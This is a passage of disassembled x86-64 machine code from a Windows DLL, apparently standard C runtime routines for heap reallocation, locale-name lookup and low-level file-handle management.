   18000b361:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   18000b367:	75 05                	jne    0x18000b36e
   18000b369:	e8 02 b7 ff ff       	call   0x180006a70
   18000b36e:	33 f6                	xor    %esi,%esi
   18000b370:	eb 0a                	jmp    0x18000b37c
   18000b372:	48 8b da             	mov    %rdx,%rbx
   18000b375:	8b f2                	mov    %edx,%esi
   18000b377:	48 85 db             	test   %rbx,%rbx
   18000b37a:	74 11                	je     0x18000b38d
   18000b37c:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   18000b380:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   18000b386:	75 05                	jne    0x18000b38d
   18000b388:	e8 e3 b6 ff ff       	call   0x180006a70
   18000b38d:	8b c6                	mov    %esi,%eax
   18000b38f:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   18000b393:	48 33 cd             	xor    %rbp,%rcx
   18000b396:	e8 35 5f ff ff       	call   0x1800012d0
   18000b39b:	48 8b 5d 40          	mov    0x40(%rbp),%rbx
   18000b39f:	48 8b 75 48          	mov    0x48(%rbp),%rsi
   18000b3a3:	48 8b 7d 50          	mov    0x50(%rbp),%rdi
   18000b3a7:	48 8d 65 10          	lea    0x10(%rbp),%rsp
   18000b3ab:	41 5f                	pop    %r15
   18000b3ad:	41 5e                	pop    %r14
   18000b3af:	41 5d                	pop    %r13
   18000b3b1:	41 5c                	pop    %r12
   18000b3b3:	5d                   	pop    %rbp
   18000b3b4:	c3                   	ret
   18000b3b5:	cc                   	int3
   18000b3b6:	cc                   	int3
   18000b3b7:	cc                   	int3
   18000b3b8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000b3bd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000b3c2:	57                   	push   %rdi
   18000b3c3:	48 83 ec 70          	sub    $0x70,%rsp
   18000b3c7:	48 8b f2             	mov    %rdx,%rsi
   18000b3ca:	49 8b d9             	mov    %r9,%rbx
   18000b3cd:	48 8b d1             	mov    %rcx,%rdx
   18000b3d0:	41 8b f8             	mov    %r8d,%edi
   18000b3d3:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   18000b3d8:	e8 63 95 ff ff       	call   0x180004940
   18000b3dd:	8b 84 24 c0 00 00 00 	mov    0xc0(%rsp),%eax
   18000b3e4:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   18000b3e9:	89 44 24 40          	mov    %eax,0x40(%rsp)
   18000b3ed:	4c 8b cb             	mov    %rbx,%r9
   18000b3f0:	8b 84 24 b8 00 00 00 	mov    0xb8(%rsp),%eax
   18000b3f7:	44 8b c7             	mov    %edi,%r8d
   18000b3fa:	89 44 24 38          	mov    %eax,0x38(%rsp)
   18000b3fe:	48 8b d6             	mov    %rsi,%rdx
   18000b401:	8b 84 24 b0 00 00 00 	mov    0xb0(%rsp),%eax
   18000b408:	89 44 24 30          	mov    %eax,0x30(%rsp)
   18000b40c:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   18000b413:	00 
   18000b414:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   18000b419:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   18000b420:	89 44 24 20          	mov    %eax,0x20(%rsp)
   18000b424:	e8 5b fc ff ff       	call   0x18000b084
   18000b429:	80 7c 24 68 00       	cmpb   $0x0,0x68(%rsp)
   18000b42e:	74 0c                	je     0x18000b43c
   18000b430:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   18000b435:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   18000b43c:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   18000b441:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   18000b445:	49 8b 73 18          	mov    0x18(%r11),%rsi
   18000b449:	49 8b e3             	mov    %r11,%rsp
   18000b44c:	5f                   	pop    %rdi
   18000b44d:	c3                   	ret
   18000b44e:	cc                   	int3
   18000b44f:	cc                   	int3
   18000b450:	48 83 ec 28          	sub    $0x28,%rsp
   18000b454:	e8 3f cb ff ff       	call   0x180007f98
   18000b459:	0f b6 c0             	movzbl %al,%eax
   18000b45c:	83 f0 01             	xor    $0x1,%eax
   18000b45f:	48 83 c4 28          	add    $0x28,%rsp
   18000b463:	c3                   	ret
   18000b464:	cc                   	int3
   18000b465:	cc                   	int3
   18000b466:	cc                   	int3
   18000b467:	cc                   	int3
   18000b468:	cc                   	int3
   18000b469:	cc                   	int3
   18000b46a:	cc                   	int3
   18000b46b:	cc                   	int3
   18000b46c:	cc                   	int3
   18000b46d:	cc                   	int3
   18000b46e:	cc                   	int3
   18000b46f:	cc                   	int3
   18000b470:	48 83 ec 28          	sub    $0x28,%rsp
   18000b474:	48 85 c9             	test   %rcx,%rcx
   18000b477:	75 19                	jne    0x18000b492
   18000b479:	e8 76 ac ff ff       	call   0x1800060f4
   18000b47e:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   18000b484:	e8 c3 aa ff ff       	call   0x180005f4c
   18000b489:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   18000b48d:	48 83 c4 28          	add    $0x28,%rsp
   18000b491:	c3                   	ret
   18000b492:	4c 8b c1             	mov    %rcx,%r8
   18000b495:	33 d2                	xor    %edx,%edx
   18000b497:	48 8b 0d 2a fc 00 00 	mov    0xfc2a(%rip),%rcx        # 0x18001b0c8
   18000b49e:	48 83 c4 28          	add    $0x28,%rsp
   18000b4a2:	48 ff 25 47 3d 00 00 	rex.W jmp *0x3d47(%rip)        # 0x18000f1f0
   18000b4a9:	cc                   	int3
   18000b4aa:	cc                   	int3
   18000b4ab:	cc                   	int3
   18000b4ac:	cc                   	int3
   18000b4ad:	cc                   	int3
   18000b4ae:	cc                   	int3
   18000b4af:	cc                   	int3
   18000b4b0:	e9 bb ff ff ff       	jmp    0x18000b470
   18000b4b5:	cc                   	int3
   18000b4b6:	cc                   	int3
   18000b4b7:	cc                   	int3
   18000b4b8:	cc                   	int3
   18000b4b9:	cc                   	int3
   18000b4ba:	cc                   	int3
   18000b4bb:	cc                   	int3
   18000b4bc:	cc                   	int3
   18000b4bd:	cc                   	int3
   18000b4be:	cc                   	int3
   18000b4bf:	cc                   	int3
   18000b4c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000b4c5:	57                   	push   %rdi
   18000b4c6:	48 83 ec 20          	sub    $0x20,%rsp
   18000b4ca:	48 8b da             	mov    %rdx,%rbx
   18000b4cd:	48 8b f9             	mov    %rcx,%rdi
   18000b4d0:	48 85 c9             	test   %rcx,%rcx
   18000b4d3:	75 0a                	jne    0x18000b4df
   18000b4d5:	48 8b ca             	mov    %rdx,%rcx
   18000b4d8:	e8 13 e3 ff ff       	call   0x1800097f0
   18000b4dd:	eb 1f                	jmp    0x18000b4fe
   18000b4df:	48 85 db             	test   %rbx,%rbx
   18000b4e2:	75 07                	jne    0x18000b4eb
   18000b4e4:	e8 87 b5 ff ff       	call   0x180006a70
   18000b4e9:	eb 11                	jmp    0x18000b4fc
   18000b4eb:	48 83 fb e0          	cmp    $0xffffffffffffffe0,%rbx
   18000b4ef:	76 2d                	jbe    0x18000b51e
   18000b4f1:	e8 fe ab ff ff       	call   0x1800060f4
   18000b4f6:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   18000b4fc:	33 c0                	xor    %eax,%eax
   18000b4fe:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000b503:	48 83 c4 20          	add    $0x20,%rsp
   18000b507:	5f                   	pop    %rdi
   18000b508:	c3                   	ret
   18000b509:	e8 72 f1 ff ff       	call   0x18000a680
   18000b50e:	85 c0                	test   %eax,%eax
   18000b510:	74 df                	je     0x18000b4f1
   18000b512:	48 8b cb             	mov    %rbx,%rcx
   18000b515:	e8 f6 d9 ff ff       	call   0x180008f10
   18000b51a:	85 c0                	test   %eax,%eax
   18000b51c:	74 d3                	je     0x18000b4f1
   18000b51e:	48 8b 0d a3 fb 00 00 	mov    0xfba3(%rip),%rcx        # 0x18001b0c8
   18000b525:	4c 8b cb             	mov    %rbx,%r9
   18000b528:	4c 8b c7             	mov    %rdi,%r8
   18000b52b:	33 d2                	xor    %edx,%edx
   18000b52d:	ff 15 c5 3c 00 00    	call   *0x3cc5(%rip)        # 0x18000f1f8
   18000b533:	48 85 c0             	test   %rax,%rax
   18000b536:	74 d1                	je     0x18000b509
   18000b538:	eb c4                	jmp    0x18000b4fe
   18000b53a:	cc                   	int3
   18000b53b:	cc                   	int3
   18000b53c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000b541:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000b546:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000b54b:	57                   	push   %rdi
   18000b54c:	41 56                	push   %r14
   18000b54e:	41 57                	push   %r15
   18000b550:	48 83 ec 20          	sub    $0x20,%rsp
   18000b554:	48 8b f9             	mov    %rcx,%rdi
   18000b557:	48 85 c9             	test   %rcx,%rcx
   18000b55a:	74 4b                	je     0x18000b5a7
   18000b55c:	33 db                	xor    %ebx,%ebx
   18000b55e:	4c 8d 3d 9b 4a ff ff 	lea    -0xb565(%rip),%r15        # 0x180000000
   18000b565:	be e3 00 00 00       	mov    $0xe3,%esi
   18000b56a:	8d 04 1e             	lea    (%rsi,%rbx,1),%eax
   18000b56d:	41 b8 55 00 00 00    	mov    $0x55,%r8d
   18000b573:	99                   	cltd
   18000b574:	48 8b cf             	mov    %rdi,%rcx
   18000b577:	2b c2                	sub    %edx,%eax
   18000b579:	d1 f8                	sar    $1,%eax
   18000b57b:	48 63 e8             	movslq %eax,%rbp
   18000b57e:	4c 8b f5             	mov    %rbp,%r14
   18000b581:	4d 03 f6             	add    %r14,%r14
   18000b584:	4b 8b 94 f7 60 34 01 	mov    0x13460(%r15,%r14,8),%rdx
   18000b58b:	00 
   18000b58c:	e8 8f 12 00 00       	call   0x18000c820
   18000b591:	85 c0                	test   %eax,%eax
   18000b593:	74 2d                	je     0x18000b5c2
   18000b595:	8d 4d ff             	lea    -0x1(%rbp),%ecx
   18000b598:	0f 49 ce             	cmovns %esi,%ecx
   18000b59b:	8b f1                	mov    %ecx,%esi
   18000b59d:	8d 4d 01             	lea    0x1(%rbp),%ecx
   18000b5a0:	0f 49 d9             	cmovns %ecx,%ebx
   18000b5a3:	3b de                	cmp    %esi,%ebx
   18000b5a5:	7e c3                	jle    0x18000b56a
   18000b5a7:	33 c0                	xor    %eax,%eax
   18000b5a9:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   18000b5ae:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   18000b5b3:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   18000b5b8:	48 83 c4 20          	add    $0x20,%rsp
   18000b5bc:	41 5f                	pop    %r15
   18000b5be:	41 5e                	pop    %r14
   18000b5c0:	5f                   	pop    %rdi
   18000b5c1:	c3                   	ret
   18000b5c2:	4b 63 84 f7 68 34 01 	movslq 0x13468(%r15,%r14,8),%rax
   18000b5c9:	00 
   18000b5ca:	85 c0                	test   %eax,%eax
   18000b5cc:	78 d9                	js     0x18000b5a7
   18000b5ce:	48 3d e4 00 00 00    	cmp    $0xe4,%rax
   18000b5d4:	73 d1                	jae    0x18000b5a7
   18000b5d6:	48 03 c0             	add    %rax,%rax
   18000b5d9:	41 8b 84 c7 00 1a 01 	mov    0x11a00(%r15,%rax,8),%eax
   18000b5e0:	00 
   18000b5e1:	eb c6                	jmp    0x18000b5a9
   18000b5e3:	cc                   	int3
   18000b5e4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000b5e9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000b5ee:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000b5f3:	57                   	push   %rdi
   18000b5f4:	48 83 ec 20          	sub    $0x20,%rsp
   18000b5f8:	ba 48 00 00 00       	mov    $0x48,%edx
   18000b5fd:	8d 4a f8             	lea    -0x8(%rdx),%ecx
   18000b600:	e8 eb b3 ff ff       	call   0x1800069f0
   18000b605:	33 f6                	xor    %esi,%esi
   18000b607:	48 8b d8             	mov    %rax,%rbx
   18000b60a:	48 85 c0             	test   %rax,%rax
   18000b60d:	74 5b                	je     0x18000b66a
   18000b60f:	48 8d a8 00 12 00 00 	lea    0x1200(%rax),%rbp
   18000b616:	48 3b c5             	cmp    %rbp,%rax
   18000b619:	74 4c                	je     0x18000b667
   18000b61b:	48 8d 78 30          	lea    0x30(%rax),%rdi
   18000b61f:	48 8d 4f d0          	lea    -0x30(%rdi),%rcx
   18000b623:	45 33 c0             	xor    %r8d,%r8d
   18000b626:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   18000b62b:	e8 10 d3 ff ff       	call   0x180008940
   18000b630:	48 83 4f f8 ff       	orq    $0xffffffffffffffff,-0x8(%rdi)
   18000b635:	48 8d 4f 0e          	lea    0xe(%rdi),%rcx
   18000b639:	80 67 0d f8          	andb   $0xf8,0xd(%rdi)
   18000b63d:	8b c6                	mov    %esi,%eax
   18000b63f:	48 89 37             	mov    %rsi,(%rdi)
   18000b642:	c7 47 08 00 00 0a 0a 	movl   $0xa0a0000,0x8(%rdi)
   18000b649:	c6 47 0c 0a          	movb   $0xa,0xc(%rdi)
   18000b64d:	40 88 31             	mov    %sil,(%rcx)
   18000b650:	ff c0                	inc    %eax
   18000b652:	48 ff c1             	inc    %rcx
   18000b655:	83 f8 05             	cmp    $0x5,%eax
   18000b658:	72 f3                	jb     0x18000b64d
   18000b65a:	48 83 c7 48          	add    $0x48,%rdi
   18000b65e:	48 8d 47 d0          	lea    -0x30(%rdi),%rax
   18000b662:	48 3b c5             	cmp    %rbp,%rax
   18000b665:	75 b8                	jne    0x18000b61f
   18000b667:	48 8b f3             	mov    %rbx,%rsi
   18000b66a:	33 c9                	xor    %ecx,%ecx
   18000b66c:	e8 ff b3 ff ff       	call   0x180006a70
   18000b671:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000b676:	48 8b c6             	mov    %rsi,%rax
   18000b679:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   18000b67e:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   18000b683:	48 83 c4 20          	add    $0x20,%rsp
   18000b687:	5f                   	pop    %rdi
   18000b688:	c3                   	ret
   18000b689:	cc                   	int3
   18000b68a:	cc                   	int3
   18000b68b:	cc                   	int3
   18000b68c:	48 85 c9             	test   %rcx,%rcx
   18000b68f:	74 4a                	je     0x18000b6db
   18000b691:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000b696:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000b69b:	57                   	push   %rdi
   18000b69c:	48 83 ec 20          	sub    $0x20,%rsp
   18000b6a0:	48 8d b1 00 12 00 00 	lea    0x1200(%rcx),%rsi
   18000b6a7:	48 8b d9             	mov    %rcx,%rbx
   18000b6aa:	48 8b f9             	mov    %rcx,%rdi
   18000b6ad:	48 3b ce             	cmp    %rsi,%rcx
   18000b6b0:	74 12                	je     0x18000b6c4
   18000b6b2:	48 8b cf             	mov    %rdi,%rcx
   18000b6b5:	ff 15 fd 39 00 00    	call   *0x39fd(%rip)        # 0x18000f0b8
   18000b6bb:	48 83 c7 48          	add    $0x48,%rdi
   18000b6bf:	48 3b fe             	cmp    %rsi,%rdi
   18000b6c2:	75 ee                	jne    0x18000b6b2
   18000b6c4:	48 8b cb             	mov    %rbx,%rcx
   18000b6c7:	e8 a4 b3 ff ff       	call   0x180006a70
   18000b6cc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000b6d1:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000b6d6:	48 83 c4 20          	add    $0x20,%rsp
   18000b6da:	5f                   	pop    %rdi
   18000b6db:	c3                   	ret
   18000b6dc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000b6e1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000b6e6:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   18000b6eb:	41 57                	push   %r15
   18000b6ed:	48 83 ec 30          	sub    $0x30,%rsp
   18000b6f1:	8b f1                	mov    %ecx,%esi
   18000b6f3:	81 f9 00 20 00 00    	cmp    $0x2000,%ecx
   18000b6f9:	72 29                	jb     0x18000b724
   18000b6fb:	e8 f4 a9 ff ff       	call   0x1800060f4
   18000b700:	bb 09 00 00 00       	mov    $0x9,%ebx
   18000b705:	89 18                	mov    %ebx,(%rax)
   18000b707:	e8 40 a8 ff ff       	call   0x180005f4c
   18000b70c:	8b c3                	mov    %ebx,%eax
   18000b70e:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   18000b713:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   18000b718:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   18000b71d:	48 83 c4 30          	add    $0x30,%rsp
   18000b721:	41 5f                	pop    %r15
   18000b723:	c3                   	ret
   18000b724:	33 ff                	xor    %edi,%edi
   18000b726:	8d 4f 07             	lea    0x7(%rdi),%ecx
   18000b729:	e8 ea b1 ff ff       	call   0x180006918
   18000b72e:	90                   	nop
   18000b72f:	8b df                	mov    %edi,%ebx
   18000b731:	8b 05 99 fd 00 00    	mov    0xfd99(%rip),%eax        # 0x18001b4d0
   18000b737:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   18000b73c:	3b f0                	cmp    %eax,%esi
   18000b73e:	7c 36                	jl     0x18000b776
   18000b740:	4c 8d 3d 89 f9 00 00 	lea    0xf989(%rip),%r15        # 0x18001b0d0
   18000b747:	49 39 3c df          	cmp    %rdi,(%r15,%rbx,8)
   18000b74b:	74 02                	je     0x18000b74f
   18000b74d:	eb 22                	jmp    0x18000b771
   18000b74f:	e8 90 fe ff ff       	call   0x18000b5e4
   18000b754:	49 89 04 df          	mov    %rax,(%r15,%rbx,8)
   18000b758:	48 85 c0             	test   %rax,%rax
   18000b75b:	75 05                	jne    0x18000b762
   18000b75d:	8d 78 0c             	lea    0xc(%rax),%edi
   18000b760:	eb 14                	jmp    0x18000b776
   18000b762:	8b 05 68 fd 00 00    	mov    0xfd68(%rip),%eax        # 0x18001b4d0
   18000b768:	83 c0 40             	add    $0x40,%eax
   18000b76b:	89 05 5f fd 00 00    	mov    %eax,0xfd5f(%rip)        # 0x18001b4d0
   18000b771:	48 ff c3             	inc    %rbx
   18000b774:	eb c1                	jmp    0x18000b737
   18000b776:	b9 07 00 00 00       	mov    $0x7,%ecx
   18000b77b:	e8 ec b1 ff ff       	call   0x18000696c
   18000b780:	8b c7                	mov    %edi,%eax
   18000b782:	eb 8a                	jmp    0x18000b70e
   18000b784:	48 63 d1             	movslq %ecx,%rdx
   18000b787:	4c 8d 05 42 f9 00 00 	lea    0xf942(%rip),%r8        # 0x18001b0d0
   18000b78e:	48 8b c2             	mov    %rdx,%rax
   18000b791:	83 e2 3f             	and    $0x3f,%edx
   18000b794:	48 c1 f8 06          	sar    $0x6,%rax
   18000b798:	48 8d 0c d2          	lea    (%rdx,%rdx,8),%rcx
   18000b79c:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   18000b7a0:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   18000b7a4:	48 ff 25 f5 38 00 00 	rex.W jmp *0x38f5(%rip)        # 0x18000f0a0
   18000b7ab:	cc                   	int3
   18000b7ac:	48 63 d1             	movslq %ecx,%rdx
   18000b7af:	4c 8d 05 1a f9 00 00 	lea    0xf91a(%rip),%r8        # 0x18001b0d0
   18000b7b6:	48 8b c2             	mov    %rdx,%rax
   18000b7b9:	83 e2 3f             	and    $0x3f,%edx
   18000b7bc:	48 c1 f8 06          	sar    $0x6,%rax
   18000b7c0:	48 8d 0c d2          	lea    (%rdx,%rdx,8),%rcx
   18000b7c4:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   18000b7c8:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   18000b7cc:	48 ff 25 d5 38 00 00 	rex.W jmp *0x38d5(%rip)        # 0x18000f0a8
   18000b7d3:	cc                   	int3
   18000b7d4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000b7d9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000b7de:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   18000b7e3:	41 56                	push   %r14
   18000b7e5:	48 83 ec 20          	sub    $0x20,%rsp
   18000b7e9:	48 63 d9             	movslq %ecx,%rbx
   18000b7ec:	85 c9                	test   %ecx,%ecx
   18000b7ee:	78 72                	js     0x18000b862
   18000b7f0:	3b 1d da fc 00 00    	cmp    0xfcda(%rip),%ebx        # 0x18001b4d0
   18000b7f6:	73 6a                	jae    0x18000b862
   18000b7f8:	48 8b c3             	mov    %rbx,%rax
   18000b7fb:	4c 8d 35 ce f8 00 00 	lea    0xf8ce(%rip),%r14        # 0x18001b0d0
   18000b802:	83 e0 3f             	and    $0x3f,%eax
   18000b805:	48 8b f3             	mov    %rbx,%rsi
   18000b808:	48 c1 ee 06          	shr    $0x6,%rsi
   18000b80c:	48 8d 3c c0          	lea    (%rax,%rax,8),%rdi
   18000b810:	49 8b 04 f6          	mov    (%r14,%rsi,8),%rax
   18000b814:	f6 44 f8 38 01       	testb  $0x1,0x38(%rax,%rdi,8)
   18000b819:	74 47                	je     0x18000b862
   18000b81b:	48 83 7c f8 28 ff    	cmpq   $0xffffffffffffffff,0x28(%rax,%rdi,8)
   18000b821:	74 3f                	je     0x18000b862
   18000b823:	e8 90 10 00 00       	call   0x18000c8b8
   18000b828:	83 f8 01             	cmp    $0x1,%eax
   18000b82b:	75 27                	jne    0x18000b854
   18000b82d:	85 db                	test   %ebx,%ebx
   18000b82f:	74 16                	je     0x18000b847
   18000b831:	2b d8                	sub    %eax,%ebx
   18000b833:	74 0b                	je     0x18000b840
   18000b835:	3b d8                	cmp    %eax,%ebx
   18000b837:	75 1b                	jne    0x18000b854
   18000b839:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   18000b83e:	eb 0c                	jmp    0x18000b84c
   18000b840:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   18000b845:	eb 05                	jmp    0x18000b84c
   18000b847:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   18000b84c:	33 d2                	xor    %edx,%edx
   18000b84e:	ff 15 ac 39 00 00    	call   *0x39ac(%rip)        # 0x18000f200
   18000b854:	49 8b 04 f6          	mov    (%r14,%rsi,8),%rax
   18000b858:	48 83 4c f8 28 ff    	orq    $0xffffffffffffffff,0x28(%rax,%rdi,8)
   18000b85e:	33 c0                	xor    %eax,%eax
   18000b860:	eb 16                	jmp    0x18000b878
   18000b862:	e8 8d a8 ff ff       	call   0x1800060f4
   18000b867:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000b86d:	e8 5e a8 ff ff       	call   0x1800060d0
   18000b872:	83 20 00             	andl   $0x0,(%rax)
   18000b875:	83 c8 ff             	or     $0xffffffff,%eax
   18000b878:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000b87d:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000b882:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   18000b887:	48 83 c4 20          	add    $0x20,%rsp
   18000b88b:	41 5e                	pop    %r14
   18000b88d:	c3                   	ret
   18000b88e:	cc                   	int3
   18000b88f:	cc                   	int3
   18000b890:	48 83 ec 28          	sub    $0x28,%rsp
   18000b894:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   18000b897:	75 15                	jne    0x18000b8ae
   18000b899:	e8 32 a8 ff ff       	call   0x1800060d0
   18000b89e:	83 20 00             	andl   $0x0,(%rax)
   18000b8a1:	e8 4e a8 ff ff       	call   0x1800060f4
   18000b8a6:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000b8ac:	eb 4e                	jmp    0x18000b8fc
   18000b8ae:	85 c9                	test   %ecx,%ecx
   18000b8b0:	78 32                	js     0x18000b8e4
   18000b8b2:	3b 0d 18 fc 00 00    	cmp    0xfc18(%rip),%ecx        # 0x18001b4d0
   18000b8b8:	73 2a                	jae    0x18000b8e4
   18000b8ba:	48 63 c9             	movslq %ecx,%rcx
   18000b8bd:	4c 8d 05 0c f8 00 00 	lea    0xf80c(%rip),%r8        # 0x18001b0d0
   18000b8c4:	48 8b c1             	mov    %rcx,%rax
   18000b8c7:	83 e1 3f             	and    $0x3f,%ecx
   18000b8ca:	48 c1 e8 06          	shr    $0x6,%rax
   18000b8ce:	48 8d 14 c9          	lea    (%rcx,%rcx,8),%rdx
   18000b8d2:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   18000b8d6:	f6 44 d0 38 01       	testb  $0x1,0x38(%rax,%rdx,8)
   18000b8db:	74 07                	je     0x18000b8e4
   18000b8dd:	48 8b 44 d0 28       	mov    0x28(%rax,%rdx,8),%rax
   18000b8e2:	eb 1c                	jmp    0x18000b900
   18000b8e4:	e8 e7 a7 ff ff       	call   0x1800060d0
   18000b8e9:	83 20 00             	andl   $0x0,(%rax)
   18000b8ec:	e8 03 a8 ff ff       	call   0x1800060f4
   18000b8f1:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000b8f7:	e8 50 a6 ff ff       	call   0x180005f4c
   18000b8fc:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   18000b900:	48 83 c4 28          	add    $0x28,%rsp
   18000b904:	c3                   	ret
   18000b905:	cc                   	int3
   18000b906:	cc                   	int3
   18000b907:	cc                   	int3
   18000b908:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000b90d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   18000b912:	57                   	push   %rdi
   18000b913:	48 83 ec 20          	sub    $0x20,%rsp
   18000b917:	49 8b f9             	mov    %r9,%rdi
   18000b91a:	49 8b d8             	mov    %r8,%rbx
   18000b91d:	8b 0a                	mov    (%rdx),%ecx
   18000b91f:	e8 60 fe ff ff       	call   0x18000b784
   18000b924:	90                   	nop
   18000b925:	48 8b 03             	mov    (%rbx),%rax
   18000b928:	48 63 08             	movslq (%rax),%rcx
   18000b92b:	48 8b d1             	mov    %rcx,%rdx
   18000b92e:	48 8b c1             	mov    %rcx,%rax
   18000b931:	48 c1 f8 06          	sar    $0x6,%rax
   18000b935:	4c 8d 05 94 f7 00 00 	lea    0xf794(%rip),%r8        # 0x18001b0d0
   18000b93c:	83 e2 3f             	and    $0x3f,%edx
   18000b93f:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   18000b943:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   18000b947:	f6 44 d0 38 01       	testb  $0x1,0x38(%rax,%rdx,8)
   18000b94c:	74 23                	je     0x18000b971
   18000b94e:	e8 3d ff ff ff       	call   0x18000b890
   18000b953:	48 8b c8             	mov    %rax,%rcx
   18000b956:	ff 15 ac 38 00 00    	call   *0x38ac(%rip)        # 0x18000f208
   18000b95c:	33 db                	xor    %ebx,%ebx
   18000b95e:	85 c0                	test   %eax,%eax
   18000b960:	75 1d                	jne    0x18000b97f
   18000b962:	ff 15 08 37 00 00    	call   *0x3708(%rip)        # 0x18000f070
   18000b968:	8b d8                	mov    %eax,%ebx
   18000b96a:	e8 61 a7 ff ff       	call   0x1800060d0
   18000b96f:	89 18                	mov    %ebx,(%rax)
   18000b971:	e8 7e a7 ff ff       	call   0x1800060f4
   18000b976:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000b97c:	83 cb ff             	or     $0xffffffff,%ebx
   18000b97f:	8b 0f                	mov    (%rdi),%ecx
   18000b981:	e8 26 fe ff ff       	call   0x18000b7ac
   18000b986:	8b c3                	mov    %ebx,%eax
   18000b988:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000b98d:	48 83 c4 20          	add    $0x20,%rsp
   18000b991:	5f                   	pop    %rdi
   18000b992:	c3                   	ret
   18000b993:	cc                   	int3
   18000b994:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   18000b998:	48 83 ec 38          	sub    $0x38,%rsp
   18000b99c:	48 63 d1             	movslq %ecx,%rdx
   18000b99f:	83 fa fe             	cmp    $0xfffffffe,%edx
   18000b9a2:	75 0d                	jne    0x18000b9b1
   18000b9a4:	e8 4b a7 ff ff       	call   0x1800060f4
   18000b9a9:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000b9af:	eb 6c                	jmp    0x18000ba1d
   18000b9b1:	85 c9                	test   %ecx,%ecx
   18000b9b3:	78 58                	js     0x18000ba0d
   18000b9b5:	3b 15 15 fb 00 00    	cmp    0xfb15(%rip),%edx        # 0x18001b4d0
   18000b9bb:	73 50                	jae    0x18000ba0d
   18000b9bd:	48 8b ca             	mov    %rdx,%rcx
   18000b9c0:	4c 8d 05 09 f7 00 00 	lea    0xf709(%rip),%r8        # 0x18001b0d0
   18000b9c7:	83 e1 3f             	and    $0x3f,%ecx
   18000b9ca:	48 8b c2             	mov    %rdx,%rax
   18000b9cd:	48 c1 f8 06          	sar    $0x6,%rax
   18000b9d1:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   18000b9d5:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   18000b9d9:	f6 44 c8 38 01       	testb  $0x1,0x38(%rax,%rcx,8)
   18000b9de:	74 2d                	je     0x18000ba0d
   18000b9e0:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   18000b9e5:	89 54 24 50          	mov    %edx,0x50(%rsp)
   18000b9e9:	89 54 24 58          	mov    %edx,0x58(%rsp)
